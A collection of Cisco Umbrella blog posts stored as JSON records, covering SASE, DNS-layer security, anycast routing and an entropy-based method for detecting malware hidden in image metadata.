{"website": "Cisco-Umbrella", "title": "How to secure remote workers and branch offices with SASE", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/how-to-secure-remote-workers-and-branch-offices-with-sase", "abstract": "These days it seems like the only constant is change, and the networking and security worlds are no exception. Industry predictions around consolidation, cloud adoption, and convergence that were previously considered aggressive now seem understated. And with the unprecedented move to remote work across industries, these massive shifts continue to accelerate. The network perimeter is evaporating Do you remember the last time you were in an office? If you’re like many people, it can seem like a lifetime ago that you were inside the walls of an office building. Some (or many) will return to the office in the future, but the capability to work from anywhere is here to stay. The same goes for your digital presence. In the past, networking and security models were perimeter-based, and policies were applied based on whether traffic was inside, outside, or moving through perimeter-based defenses. In today’s world, there is no hard line between “inside” and “outside” the office walls. This requires a new approach to secure users, data, and applications. There’s more data in more places than ever before As cloud adoption accelerates and more organizations store business-critical data in SaaS apps, the amount of internet traffic multiplies quickly. Bandwidth needs can vary dramatically over time, and traditional networking appliances struggle to keep up with the demands of newer types of content and a higher percentage of encrypted traffic. This leads to issues with application performance and latency – a serious problem for fast-paced industries. It’s difficult to scale the network in an elastic fashion with old-school networking technology. Without a flexible networking architecture, the lofty promises of cloud efficiency will go unrealized. Security has become too complex Along with the growth in complexity from distributed networks and multi-cloud environments, keeping your users and data secure has grown more complicated as well. Cloud and SaaS adoption are great news for productivity and velocity, but they can easily lead to gaps in security and issues with compliance or acceptable use. With networking and security delivered together, it’s easier to scale for growth and throughput across a wide range of security and compliance functions. Enter SASE (Secure Access Service Edge) Coined by Gartner in late 2019, the SASE concept aims to simplify today’s complex IT environment through a combined cloud-native networking and security architecture. The benefits are many but can be distilled down into three major categories: simplicity, security, and scalability. Simplicity Deploying new networking and security capabilities has never been easy, but with many organizations working remotely for the foreseeable future, it’s more important than ever to keep things as simple as possible for your security teams. Purchasing fewer individual components and having built-in integration between networking and security elements saves time and money up front and makes day to day operations more streamlined. Using a cloud-native networking and security platform takes some of the pressure off your security analysts by allowing networking and security data to be easily aggregated (along with third-party feeds) to automate threat detection, management tasks, and remediation steps. Security It’s no use having a flexible, scalable, easy-to-manage network if you can’t secure it effectively. Cyberattacks are growing in number and sophistication and leading to countless hours of lost productivity, plus reputation damage for the impacted organizations. As malware attacks become more automated and complex, cybersecurity professionals need to remain vigilant against gaps in visibility and protection. By bringing networking and security together into one platform, the SASE architecture can improve your security posture and provide the strongest defense against cyberattacks. Scalability Your network rarely stays the same for long. Onboarding new employees, integrating acquisitions, and shifting workloads to the cloud all require significant configuration changes, but need to happen quickly. As more branches and users move to a direct-internet-access (DIA) approach it’s critical to have a simple way to make and configure new connections from either an individual device agent or a branch. A SASE architecture must provide fast, flexible, and scalable networking connections enabling high performance connectivity for users wherever they are. How to get started with a SASE approach Implementing a SASE architecture is not easy, but the benefits are clear. To better set up your organization for success today and in the future, there are a few key steps to consider. Choose a solution that allows you to scale your network as your business evolves and provide effective security for users wherever they choose to work Invest in a converged networking and security architecture that doesn’t require compromises in speed, performance or user experience Choose technology that minimizes the number of policy control points, thereby simplifying both management and enforcement Take small steps now to set you up for success tomorrow, and in the future To get started, read the report Quick Answer: Cost Effectively Scaling Secure Access While Preparing for a Remote Workforce , where you’ll learn about: How to secure network access for your remote workforce today How cloud-delivered frameworks like ZTNA and SASE combine to deliver secure access Steps you can take now to prepare for the future of your business Get the Gartner report.", "date": "2021-01-19"},
{"website": "Cisco-Umbrella", "title": "Locking Down: Allowlist-Only Mode", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/umbrella-product-updateallowlist-only-mode-feature", "abstract": "In IT, the most effective tools are often also the most adaptive. We believe network security should work the way your business needs it to, and allow change to be simple. The new Umbrella Dashboard plays a huge role in making this happen. When we launched the Umbrella product line in November of last year, we moved the Enterprise and Insights business security products under the Umbrella name. A major concern for us has been making sure all our customers get the same great OpenDNS experience in the updated dashboard. The goal is to keep management simple and intuitive, while also providing the features needed to make this cloud-delivered solution adapt for your environment. We’re excited to tell you that we’ve now released the Allowlist-Only feature for the Umbrella Dashboard. It’s a feature not widely used, but Allowlist-Only is a great way to add extra security to the networks, devices, or individual users that need it. The feature will block the entire Internet, allowing only sites deliberately added to an allowlist. Keep in mind, this setting is not for everyone. Blocking all sites and actively allowlisting safe ones may lead to many headaches depending on your organization or userbase’s need. However, if your organization wants to lock down the Internet to prevent data leaks or security breaches, a Allowlist-Only policy can keep specific servers or machines safer by preventing any outbound activity to unsanctioned sites. For more info on how you can set up and use the Allowlist-Only feature, access Umbrella technical documentation here .", "date": "2013-02-22"},
{"website": "Cisco-Umbrella", "title": "Keep these 10 things in mind as you start with SASE", "author": ["Andrea Gross"], "link": "https://umbrella.cisco.com/blog/keep-these-10-things-in-mind-as-you-start-with-sase", "abstract": "Every journey starts with one step. Whether that step is the first toward climbing a mountain or launching the campaign to keep your organization safe from cyberthreats, it’s important just to take that first step forward. You might not want to hear this, but cyberthreats are becoming more advanced and attackers are using new techniques to exploit vulnerabilities and breach targeted networks. Even more challenging? The worldwide shortage of qualified security professionals is a trend that will continue for the foreseeable future. More advanced attacks and fewer qualified security professionals are an ongoing risk for organizations trying to do the right thing by protecting their remote, mobile, and roaming users with various siloed security tools that add cost, and complexity and frustrate employees. This may sound like too much to conquer, but we can help you take that first step forward to protect your networks and users. In its August 2019 report, The Future of Network Security Is in the Cloud, Gartner defined the secure access service edge (SASE) concept as “an emerging offering combining comprehensive [wide area network] capabilities with comprehensive network security functions (such as SWG, [cloud access security broker], [firewall as a service] and [zero trust network access]) to support the dynamic secure access needs of digital enterprises.” What does this all mean? It means the SASE concept combines several networking and security capabilities and functions normally carried in multiple, siloed point solutions into a single, fully integrated cloud-native platform. SASE is a broad concept and to keep things simple, you should look for a flexible way to get started and make demonstrable progress toward your organization’s goals. One step at a time! 10 key takeaways for SASE success Check out the ten key takeaways from our newest ebook Secure Access Service Edge (SASE) for Dummies to help set you up for success on your security journey: 1. More remote offices and roaming users The number of remote offices, mobile, and roaming users is increasing; these users are some of the most likely targets for an attacker. Because these remote and roaming users may not have access to a local IT resource, they may be less likely to contact the help desk or security team when an issue arises. 2. DIA is the new normal More organizations are providing direct Internet access (DIA) broadband links for their remote, branch, and roaming users so they can access their software-as-a-service (SaaS) applications without the slow performance and latency linked with backhauling traffic to a corporate office. 3. SaaS apps are taking over Once limited to personal apps that employees downloaded to their smartphones, SaaS apps have become core business tools supporting vital functions within the modern digital workplace. 4. The old way of networking is slow and expensive Backhauling traffic to a corporate headend is inefficient and complex. 5. Network architecture is meeting new demands SD-WAN as a standalone networking solution is great for solving enterprise networking challenges, particularly in remote and branch locations, enabling organizations to set up new sites quickly. 6. Look for a solution that reduces cost and complexity To overcome cost and performance issues, many organizations are adopting a more decentralized networking approach to optimize performance. 7. Don’t compromise on network performance The user experience is what drives successful adoption of digital initiatives in an organization. Ensure network and security platforms can provide the performance (and security) users need to stay productive – whether they are remote, roaming, or at a branch office. 8. Always keep security top-of-mind Cyberthreats like phishing and ransomware are becoming more prevalent and difficult to spot. Organized crime and nation-states initiate far more advanced attacks that can take years to detect and remove. 9. Make life easier for your operations team Attract and retain top talent by enabling innovative networking and security solutions that combine functionality in a single, cloud-delivered platform. 10. Every journey starts with a single step A fully integrated SD-WAN and cloud-native security solution can help organizations address the networking and security challenges of the digital workplace. Secure access service edge (SASE) products provide advanced networking and security functionality that allows enterprise networking and security teams the confidence to build out networks with the agility that modern businesses require. Be sure to check out all our blogs in the SASE for Dummies series: Top 10 networking and security trends and challenges How networking and cloud security solutions have evolved to connect and protect users everywhere How to address cybersecurity challenges in the cloud era with SASE What goes into the secure access service edge (SASE) solution Here’s to taking that first step forward, and to all the success that will follow! Get your free copy of our new ebook, Secure Access Service Edge (SASE) for Dummies", "date": "2021-01-05"},
{"website": "Cisco-Umbrella", "title": "Secure anywhere, protect everywhere with Cisco Umbrella and Advanced Malware Protection (AMP)", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/secure-anywhere-protect-everywhere-with-cisco-umbrella-and-advanced-malware-protection-amp", "abstract": "It’s no secret that the world of work has changed dramatically. The “office” is now almost anywhere except the traditional campus you own and protect. Your workers and your data have scattered to bedroom alcoves, kitchen tables, outdoor coffee shops, and the park bench. Organizations have more critical infrastructure, applications, and sensitive data stored in the cloud than ever before. Now, with more branch offices and home offices using direct-to-internet access, bypassing VPN and other on-premises safety features, attackers have even more incentive to target endpoints as their easiest point of entry. Today, organizations need deep visibility into what users are doing on their endpoints, regardless of location or how they connect to the Internet. Protection must be ubiquitous… This has left your cybersecurity teams stretched thin as the attack surface grows and operational complexity sets in. More than two-thirds of professionals say the shortage of skilled cybersecurity team members has an impact on their organization. As the number of endpoints continues to rise, the need for deeper security insight has never been more of an imperative. A comprehensive view of the entire security domain and real-time intelligence about what’s happening along the network perimeter are no longer a “nice to have.” They’re absolutely critical. Today, organizations need deep visibility into what users are doing on their endpoints, regardless of location or how they connect to the Internet. Protection must be ubiquitous, which means that on-premises-based security measures, by themselves, are inadequate. Cisco Umbrella unifies multiple security functions in the cloud to secure internet access and control cloud app usage from network, branch offices, and roaming users. Combining Cisco Umbrella with Cisco Advanced Malware Protection (AMP) for Endpoints provides cloud-managed, next-generation endpoint security that analyzes unknown files and automatically blocks malware from trying to run on endpoints. AMP continuously monitors and records all file activity on endpoints, regardless of file disposition, to quickly spot malicious behavior. When combined with Cisco SecureX, which connects Cisco’s integrated security portfolio for a simpler, more consistent experience across endpoints, cloud, network, and applications, organizations can use a single console to automate integrations, orchestrate playbooks, and accelerate critical security operations functions. Cisco SecureX dramatically reduces the time and effort needed to detect, investigate, and remediate — making SOC operations more efficient and effective. Together, Cisco Umbrella and Cisco AMP for Endpoints provide the visibility and control needed to protect users against malware, phishing, and command-and-control callbacks — wherever they go and whichever devices they use. To learn more, read the Secure Anywhere, Protect Everywhere ebook .", "date": "2020-12-15"},
{"website": "Cisco-Umbrella", "title": "How Texas A&M University System uses Cisco Umbrella to secure users and data", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/how-texas-am-university-system-uses-cisco-umbrella-to-secure-users-and-data", "abstract": "The Texas A&M University System had a challenging set of problems to solve. They needed to ensure that its 180,000+ users across 11 campuses and nine state government agencies could connect to the internet safely wherever they worked, without becoming vulnerable to malware and phishing attacks, accessing prohibited websites, or opening the door to information theft. To protect students, employees, and research data from cyberattacks, the security operations center needed granular visibility into all internet activities, the ability to apply consistent security controls, and the ability to block threats at the DNS and IP layers. After considering their options, the team chose to deploy Cisco Umbrella DNS-layer security across their network environment. Securing internet access anywhere and everywhere After choosing Cisco Umbrella as a security partner, the Texas A&M team saw proof of value almost immediately. “We rolled it out to our networks in five minutes,” explains Dan Basile, Executive Director for Texas A&M University System Statewide Cybersecurity Services. Since deploying Cisco Umbrella only requires an organization to update its recursive DNS server addresses to get started, it only takes minutes, not weeks or days, to start seeing results. Their security operations team saw immediate impacts from Cisco Umbrella cloud security protection at the DNS layer. “After the first month of using Cisco Umbrella, the number of malware blocks was in the millions,” says Basile. “Our information security officers said, ‘We’ve seen an enormous drop in the amount of successful malware, and we see even fewer phishing attempts for email too.’” Beyond malware protection, the team was also able to quickly enable protection for its large number of remote workers, including students, faculty, researchers, and staff. “The Umbrella roaming client is great because it protects that user and asset no matter where they are. You have the same policy set being pushed down to it and the same DNS protection no matter where it lives,” says Basile. Hear from the Texas A&M System team about how Cisco Umbrella helped improve their security (2:48): Stopping cyberattacks before they start with threat intelligence With DNS-layer protection, a potential malware infection can be stopped before it even gets to the download phase. This allows security teams to focus on more complex and sophisticated threats, by freeing up investigation time for its security analysts and reduce the amount of time spent on the remediation of malware. “The biggest impact we saw from Umbrella was the drop in the number of security alerts on our other tool sets. We’re probably saving about 100 hours per week across all of my employees due to the reduction in these alerts,” noted Basile. Using the threat intelligence and context available through the Cisco Umbrella Investigate console offers security teams another invaluable tool. “We use Umbrella Investigate as a single stop to be able to dig deep on DNS investigations,” explains Basile. “We’re taking the information coming out of Cisco Investigate and using it as a resource to correlate against our other threat intelligence sources. The depth of information in Investigate makes it much easier for us to tell if we are looking at a legitimate traffic, a bad actor, or just a misconfiguration.” Beyond using the Investigate console for threat intelligence, the A&M System security team discovered another, creative use case: they use Umbrella Investigate as a training platform for students studying to become the next generation of security analysts. Read the case study to learn more about how the Texas A&M System used Cisco Umbrella DNS-layer security to protect roaming users in a complex environment and reduce security alerts by 50%.", "date": "2020-12-08"},
{"website": "Cisco-Umbrella", "title": "What goes into the secure access service edge (SASE) solution", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/what-goes-into-the-secure-access-service-edge-sase-solution", "abstract": "One of the main reasons that the secure access service edge (SASE) is getting so much attention these days is that it combines several networking and security capabilities and functions normally carried in multiple, siloed point solutions into a single, fully integrated cloud-native platform. This allows organizations to overcome cost and performance issues, resulting in a more decentralized networking approach to optimize performance and increase security. The challenge is that, like the blind men all trying to describe an elephant, it means different things to different people. In this article, we’ll look at some of the commonly accepted elements of a SASE solution and also review the approach that Cisco is taking to securing access and the network edge. Following are the major elements of SASE: Software-defined wide area networks (SD-WAN) Domain name system (DNS) layer security Secure web gateway (SWG) Firewall as a service (FWaaS) Cloud access security broker (CASB) Zero Trust Network access The Cisco approach to SASE Cisco SD-WAN cloud-scale architecture is simplicity for every size of organization Software-defined wide area networks (SD-WAN) Cisco’s approach to SASE leverages a cloud-scale SD-WAN architecture designed to meet the complex needs of modern WANs through three key areas: Advanced application optimization that delivers a predictable application experience as the business application strategy evolves Multilayered security that provides the flexibility to deploy the right security in the right place, either on-premises or cloud-delivered Simplicity at enterprise scale, which enables end-to-end policy from the user to the application over thousands of sites Cisco Umbrella multi-function cloud-native security A foundational element of the Cisco SASE architecture, Cisco Umbrella helps businesses of all sizes embrace and secure direct Internet access (DIA), secure cloud applications, and extend protection to roaming users and branch offices. Cisco Umbrella blocks requests to malicious and unwanted destinations before a connection is even established — stopping threats over any port or protocol before they reach your network or endpoints. Domain name system (DNS) layer security DNS-layer security provides the visibility needed to protect Internet access by: Logging and categorizing DNS activity by type of security threat or web content and the action taken Covering thousands of locations and users in minutes Other elements of the Cisco SASE solution include: Secure web gateway (SWG) Cisco Umbrella includes a secure web gateway (SWG) that uses a cloud-based proxy to log and inspect all your web traffic for greater transparency, control, and protection. Real-time inspection of inbound files for malware and other threats Advanced file sandboxing Full or selective SSL decryption to further protect against hidden attacks Blocking of specific user activities Content filtering by category Cloud-delivered firewall as a service With Cisco Umbrella’s cloud-delivered firewall, all activity is logged, and unwanted traffic is blocked using IP, port, and protocol rules. Cisco Umbrella’s cloud-delivered firewall provides: Visibility and control for Internet traffic across all ports and protocols Customizable IP, port, and protocol policies in the Umbrella dashboard Layer 7 application visibility and control Cloud access security broker (CASB) functionality Cisco Umbrella exposes shadow IT by providing the capability to detect and report on the cloud applications that are in use across your environment. Umbrella App Discovery offers: Extended visibility into cloud apps in use and traffic volume App details and risk information Capability to block/allow specific apps Interactive threat intelligence Cisco Umbrella analyzes 250 billion DNS requests daily, taken from Cisco’s global network into a massive graph database. It also continuously runs against statistical and machine learning models. This information is constantly analyzed by Umbrella security researchers and supplemented with intelligence from Cisco Talos to efficiently discover and block an extensive range of threats. Cisco’s unique view of the Internet enables Umbrella to uncover malicious domains, IPs, and URLs before they’re used in attacks, and helps analysts to accelerate investigations. Umbrella and SD-WAN integration With the Cisco Umbrella and Cisco SD-WAN integration, you can deploy Umbrella across your network and gain powerful cloud-delivered security to protect against threats on the Internet. Umbrella offers the flexibility to create security policies based on the level of visibility and protection that you need — all from one dashboard. Cisco SecureX Cisco SecureX simplifies security with better visibility and automation All of these capabilities won’t mean much if your team can’t quickly and easily access the information they need to understand what is happening, nor respond in a timely manner. That’s where the power of the Cisco SecureX platform comes in. The goal of this integrated security portfolio is to deliver a consistent, simplified experience that unifies visibility, enables automation, and strengthens your security. SecureX empowers your security operations center (SOC) teams with a single console for direct remediation, access to threat intelligence, and tools like casebook and incident manager. It overcomes many challenges by making threat investigations faster, simpler, and more effective. Zero Trust with Cisco Duo For organizations of all sizes that need to protect sensitive data at scale, Cisco Duo’s trusted access solution is a user-centric Zero Trust security platform. Duo’s multifactor authentication (MFA) lets you verify the identity of all users — before granting access to corporate applications. You can also ensure devices meet security standards, develop and manage access policies, and streamline remote access and single-sign-on (SSO) for enterprise applications. Cisco Umbrella also feeds huge volumes of global internet activity into a combination of statistical and machine learning models to identify new attacks being staged on the Internet. Umbrella has a highly resilient cloud infrastructure that boasts close to 100 percent uptime since 2006. Using Anycast routing, any of Cisco’s 30-plus data centers across the globe are available using the same single IP address. As a result, your requests are transparently sent to the nearest, fastest data center and failover is automatic, resulting in superior speed, effective security, and excellent user experience. So, you’ve just finished reading this blog. Why stop now? If you’re lucky – you’ll read our new ebook before anyone else at your company, and you’ll gain a reputation as a networking and security expert who can talk about SASE with the best of them. Who doesn’t love to be a hero? Ready to get started on the journey? Click to download the ebook Secure Access Service Edge (SASE) for Dummies .", "date": "2020-12-01"},
{"website": "Cisco-Umbrella", "title": "How to address cybersecurity challenges in the cloud era with SASE", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/how-to-address-cybersecurity-challenges-with-sase", "abstract": "It’s no secret – networking and security have left the building. Even before the major shift to remote working in the first half of 2020, workplaces had already made the transition to a decentralized network architecture, where computing resources are located outside the data center and most enterprise traffic is destined for public cloud services. There are more remote and roaming users than ever before, and as work moves outside the office, so does the need for secure access to enterprise applications and data. To be successful in the cloud era, IT teams need to identify a new approach to control and secure users, apps, devices, and data — anywhere and everywhere they go in the world, and no matter what apps they choose to use. According to Enterprise Strategy Group research, 32 percent of organizations report that most of their apps are now software as a service (SaaS) based. That number is expected to increase to 60 percent within two years. 1 In the past, most organizations would backhaul traffic through MPLS WAN links from remote offices back to the data center to apply security policies before sending the traffic to the public internet. Today, that centralized approach has become impractical because of the high cost of backhauling traffic over MPLS and the resulting performance issues for both branch locations and roaming users. To overcome these cost and performance issues, some businesses are adopting a more decentralized approach to optimize performance for these users with direct internet access (DIA) paths. But this approach highlights a set of new security challenges. Gaps in visibility and coverage Centralized security policies can’t be effectively managed and enforced in a decentralized network. This is because most traffic from branch locations to the cloud and internet doesn’t cross a centralized policy enforcement point. This results in visibility and coverage gaps, which increase the risk of a successful breach or compliance violation. Volume and complexity of security tools Security teams already struggle to keep up with cybersecurity threats. Many of them have lots of point solutions that are difficult to integrate and manage. These point products generate thousands of alerts — making it very difficult, if not impossible, for analysts to keep up. As a result, many alerts go untouched. Limited budgets and security resources IT and security budgets are already constrained. Deploying multiple, costly point security solutions — such as firewalls, secure web gateways (SWGs), intrusion detection and prevention systems (IDS and IPS), and data loss prevention (DLP) — to multiple locations and remotely managing these solutions with limited security resources is both impractical and ineffective. Introducing secure access service edge (SASE) In its August 2019 report, The Future of Network Security Is in the Cloud , Gartner defined the secure access service edge (SASE) concept as “an emerging offering combining comprehensive [wide area network] capabilities with comprehensive network security functions (such as SWG, [cloud access security broker], [firewall as a service] and [zero trust network access]) to support the dynamic secure access needs of digital enterprises.” 2 The SASE concept consolidates numerous networking and security capabilities and functions — traditionally delivered in multiple, siloed point solutions — in a single, fully-integrated cloud-native platform. This approach delivers some key benefits that are critical for organizations that need to address the modern networking and security challenges of an increasingly cloud-first, distributed, mobile, and global workforce. Here are four key characteristics of digitally transformed organizations that are laying the groundwork for this new concept: Identity-centric Gartner suggests that “digital business transformation inverts network and security service design patterns, shifting the focal point to the identity of the user and/or device — not the data center.” 3 Cloud-native Gartner describes modern digital enterprises as having “[m]ore sensitive data located outside of the enterprise data center in cloud services than inside” and “[m]ore user traffic destined for public cloud services than to the enterprise data center.” 4 Edge computing To support the SASE concept, Gartner describes a “worldwide fabric/mesh of network and network security capabilities that can be applied when and where needed to connect entities to the networked capabilities they need access to.” 5 Globally distributed Gartner describes the need for an “intelligent switchboard” where “identities are connected to networked capabilities via the SASE vendor’s worldwide fabric of secure access capabilities.” 6 Start your SASE journey Remember: SASE isn’t a product, a company, or a solution. It’s a broad concept that invites you to think differently about how networking and security work together in the cloud era. Two major SASE concepts are consolidation and simplification, so it makes sense to chart a course that includes both networking and security elements from a single vendor . Are you feeling overwhelmed? Start here to learn more about the SASE concept and how it works , and you can request your free copy of our new ebook, Secure Access Service Edge (SASE) for Dummies . In this ebook, you’ll learn about the benefits of software-defined wide area networking (SD-WAN) and how it can lower your networking service costs and improve performance. You’ll also learn about the best way to secure new traffic flows with cloud-delivered security. What are you waiting for? If you missed our earlier posts about how networking and security have evolved, you can catch up on your reading with the links below. Top 10 networking and security trends and challenges How networking and cloud security solutions have evolved to connect and protect users everywhere 1 Enterprise Strategy Group, The Rise of Direct Internet Access , 2018 2 Gartner, The Future of Network Security is in the Cloud, 2019 3 Gartner, The Future of Network Security is in the Cloud, 2019 4 Gartner, The Future of Network Security is in the Cloud, 2019 5 Gartner, The Future of Network Security is in the Cloud, 2019 6 Gartner, The Future of Network Security is in the Cloud, 2019", "date": "2020-10-13"},
{"website": "Cisco-Umbrella", "title": "Why the Cisco Umbrella global network uses anycast routing", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/why-the-cisco-umbrella-global-network-uses-anycast-routing", "abstract": "Every day, the Cisco Umbrella global network processes over 250 billion recursive DNS requests. Simply processing these recursive DNS requests is a huge job, but we’re also tasked with ensuring that each of these queries is answered as quickly as possible. One of the technologies that helps us maintain our great availability and speed is called anycast routing . In this blog post we’ll explain what anycast routing is, how we use it, and how it helps us maintain our 100% uptime and availability for our customers. The problem with duplicate IP addresses Conventional networking wisdom tells us that every IP address for each individual host should be unique. Two hosts that are broadcasting the same IP address could lead to packets being misdirected, which could lead to some unexpected results. However, there are scenarios in which multiple hosts with the same IP address can work together effectively. This is exactly what anycast routing is. With anycast routing, the same IP address (for example, the Cisco Umbrella nameservers 208.67.222.222 & 208.67.220.220) exists on multiple servers around the world. Umbrella currently operates clusters of nameservers at 30+ unique locations around the world, each with numerous DNS resolver instances. All these DNS servers operate with the same IP addresses, which means that there are hundreds of machines across the globe with an IP address of 208.67.222.222. Border Gateway Protocol (BGP) and peering for anycast routing So how does this all work? The answer lies in the protocol that makes routing possible. The Border Gateway Protocol (BGP) is the routing protocol used by all internet service providers today to connect their networks with others across the globe. Cisco Umbrella has many direct connections with other providers via a process called BGP peering. Over each peering, we run BGP as a routing protocol. Both parties announce via BGP what network prefixes can be reached through this connection. When selecting data centers, we look for locations that enable us to “peer” with many other networks. Having all those direct connections with other networks improves redundancy as it increases the number of available paths to our users and content providers. Best of all, it improves speed and reduces latency because the round-trip time (RTT) is reduced. Just like other network protocols like TCP, BGP will deliver a packet using the shortest path to a destination. In the case of BGP, the shortest path is determined by looking at the ASPATH. This is a sequence of Autonomous Systems (AS) numbers. Each AS number represents a network or service provider (like Cisco Umbrella, which has the AS number of 36692). Cisco Umbrella uses BGP to announce the same IP address ranges from all data center locations in the world, and uses the internet routing system to make sure that our users will use whichever DNS server is closest to them (or, phrased another way, uses the shortest number of network hops to get to its destination). How Cisco Umbrella uses anycast routing When you connect to a cloud security service, performance is critical. Using that service cannot break or slow down your internet connection. Cisco Umbrella has delivered 100% business uptime since 2006 by using Anycast routing. Umbrella’s network of data centers is co-located with the top internet exchange points (IXPs) on every continent where we have a presence. IXPs are locations where organizations either physically or virtually connect their routers to exchange data. Let’s look at an example for a user in Miami. This user is a customer of a regional ISP based in southern Florida. The ISP has a direct peering with Cisco Umbrella and has connections to two different large (Tier 1) transit providers (which are illustrated as provider A and provider B in the drawing below). In this scenario, Umbrella traffic to and from this user will go to our data center in Miami and is routed over the direct path between the ISP and Umbrella. This is because we have a direct BGP peering here (shown by the green line). Direct connections are preferred as they have a shorter ASPATH, which saves both parties money and typically results in a lower RTT. The diagram above describes a typical scenario where we peer with local and regional ISPs, but we also have two or three transit providers at each site. Looking at the diagram, it’s obvious that this setup offers a variety of different paths for traffic from this user to get to Umbrella, or redundancy (many connections). If something happens to disable the peering connection, the traffic will automatically fail over to the one of the numerous alternative transit paths. Like a detour on the highway, the traffic can continue on its merry way to the destination, and the user has an undisturbed internet experience. Let’s imagine something happens to Umbrella’s Miami data center, like a major hurricane that knocks out the power for a long time. (Note: all data centers have backup power generators to prevent sudden failures, but those data centers may be shut down carefully during prolonged outages to protect them in case of power spikes). The routes to this data center would be automatically withdrawn, and BGP will quickly re-route any traffic from this region to the closest alternative Umbrella data center. As routing protocols typically select the route with the shortest path, this user will most likely be routed to one of our servers in Texas. Luckily, failing over to a different data center doesn’t happen very often, but it’s good to know it will work seamlessly when needed. Failures can happen within a data center, too. Within each Umbrella data center, we run several identical instances of our DNS servers. Each DNS instance has the same IP addresses, and we use the same anycast routing technology within each data center as well. All of this is invisible to the user, but it boosts reliability. Monitoring and management Using anycast routing, while useful, can result in some interesting challenges. Imagine a simple health check, where we need to collect performance and health statistics from each DNS server. If we send a DNS request to the anycast address 208.67.222.222, this will only test the DNS server closest to our monitoring servers. To solve this problem, each DNS server can be identified by multiple addresses. Each server has a unicast address for management and monitoring purposes as well as an anycast address. This allows us to have detailed performance statistics for each specific server and helps us with troubleshooting any issues with a DNS instance. Anycast routing is the key to reliability To sum it up: anycast routing allows us to easily scale our cloud security service globally by just adding more data centers and servers, all with the same IP address. No involvement is needed from our users when we add new server capacity. We use BGP to achieve load balancing and failover within the data centers as well as globally between data centers. In the unusual case of a failover, there is no need for making changes to load balancers, proxy servers, DNS servers, etc. This would make a failover event or other configuration change totally transparent to Cisco Umbrella users. Because the IP address doesn’t change, no changes are required on the client side, and there are no other challenges like TTL caching issues. Cisco Umbrella has 30+ data centers across the globe and direct peering connections with 1,000+ CDNs and ISPs to make sure we have the shortest possible routes to our users, wherever they are. Our more than 100+ million global enterprise and consumer users get fast, reliable, secure internet access with 100% uptime since 2006. But that’s not all Umbrella can do. Learn more about how Cisco Umbrella DNS-layer security protects from cyberattacks before they even start.", "date": "2020-11-24"},
{"website": "Cisco-Umbrella", "title": "Using entropy to spot the malware hiding in plain sight", "author": ["Shyam Sundar Ramaswami"], "link": "https://umbrella.cisco.com/blog/using-entropy-to-spot-the-malware-hiding-in-plain-sight", "abstract": "(Editor’s note: This proposed solution to identifying hidden malware was first presented at Black Hat USA 2020 and is featured in the newly published report, The Modern Cybersecurity Landscape: Scaling for Threats in Motion . Download your copy here .) As malware and spam become more automated and complex, cybersecurity professionals need new tricks to spot the malware and exfiltration of stolen data that can be hiding in images (steganography) and other files. One tool that could help them spot the hidden threats would be the use of “word entropy,” assisted by machine learning. The basic concept behind word entropy is that the more complex malware gets, the less ordered, or efficient in its use of characters, that the file hiding malware becomes. This loss of order leads to entropy values that are much higher than would otherwise be expected — off-the-charts complexity that sticks out like a sore thumb. Unfortunately, hiding malware inside image files makes it very difficult to remediate. Blocking common image file types would disrupt the entire Internet, to say the least. There have been several studies on how entropy calculation can be conducted to determine whether a file is packed or encrypted using entropy. The same could be applied to image files. One way to do so is to look for randomness or noisy data in EXIF header or image trailers. This is where “word entropy” could help. Using Shannon’s entropy theory (which quantifies the amount of information contained in a variable), Python scripts, and some logic tweaking, a solution could be developed to take advantage of this phenomenon. By applying machine learning to historical data records — system information, file URLs, passwords, etc. — automation could make it easier to flag the more anomalous files for further investigation. Working against a database of normal entropy values, threat researchers and incident response teams could then quickly identify those files where suspicious data transfer was occurring. It’s actually possible to figure out if such complex malware exhibits behaviors that suggest it’s part of the same campaign or may be dropped by the same actor. The trick is to look for something called an “instruction or string similarity.” Every file in Windows makes use of the Windows API, executes call-backs during run time, or is linked to another file, ready to be used. Based on these calling conventions, one can figure out what the file might do and which family of malware follows this pattern. A solid example could be a file trying to create a process, create a thread, suspend and resume a thread that could be flagged for process injection. With historic data of threats and these techniques one can categorize the file malicious, which family it belongs to, and even which actor follows the style. As an example, we examined some compromised WordPress sites being used to host malware. The malware is used to infect a PC and steal data. Rather than call attention to itself by normal exfiltration through HTTP/S protocols, the malware employs steganography to hide the transfer of configuration data, operating system information, and more. This is done using some interesting data hiding in plain sight in the EXIF headers of the file’s metadata. Not only is the data out of place, it looks like it might be javascript eval statements. Phone numbers, passwords, and other sensitive information stolen from victims computer could also be embedded inside EXIF headers and could be exfiltrated in a super stealthy manner. Further analysis shows a search-and-replace function that exfiltrates phone numbers and system data via callbacks to a command-and-control server. Searching and replacing by itself isn’t something that would be flagged, which is why even some sandboxes will miss the threat. It is this multilayered approach to obfuscation that makes these new forms of malware attack so effective. Take a look at the image below: A sample section of metadata in an image file. The entropy analysis is focusing on the abnormally long “Model” information, highlighted in green. Here we see that the model number has Base64 malicious code embedded in it. Word entropy can be calculated for EXIF header values, image attribute values, and other key attributes. If we calculate word entropy for each of the attributes present in the metadata, we’ll derive a base and a threshold score. Then, if we calculate the entropy score for the “Model” value, we’ll see that it exceeds the threshold score and stands out as suspicious. Entropy alone cannot be a game changer in the detection of malware. Entropy has to be paired with other attributes to give an effective rating if the file is good, bad or ugly. The rise of machine learning implementation paves the way for such innovations and advanced detection methods. Instruction-seeking call patterns, string similarities when combined with attributes like mutex similarities, and variable naming patterns inside the code could give away a lot of information on which actor is engaging the malware and what similarities these samples have in common. Another trend in malware analysis is visualizing malware in grey-scale image and doing classification. This is rapidly gaining importance and is touted to tackle zero days with a good degree of accuracy. Developing a database of the normal range of entropy values for image files would help threat researchers and incident response teams in more quickly identifying those files where suspicious data transfer was occurring. Get your copy of the newly published report: The Modern Cybersecurity Landscape: Scaling for Threats in Motion .", "date": "2020-11-17"},
